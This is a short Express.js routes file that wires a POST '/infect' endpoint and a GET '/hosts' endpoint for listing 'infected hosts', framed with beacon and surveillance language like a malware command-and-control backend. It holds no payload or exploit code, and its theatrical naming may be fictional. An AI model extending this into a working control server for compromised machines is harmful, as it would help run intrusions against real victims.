// routes/piRoutes.js - The Digital Transmission Pathway

console.log("BEACON ACTIVE: Surveillance pathways are compiling...");

const express = require('express');
const router = express.Router();
const { deployPiVariant, getInfectedHosts } = require('../controllers/piController');

// The Injection Vector
router.post('/infect', deployPiVariant);

// The Surveillance Vector
router.get('/hosts', getInfectedHosts);

module.exports = router;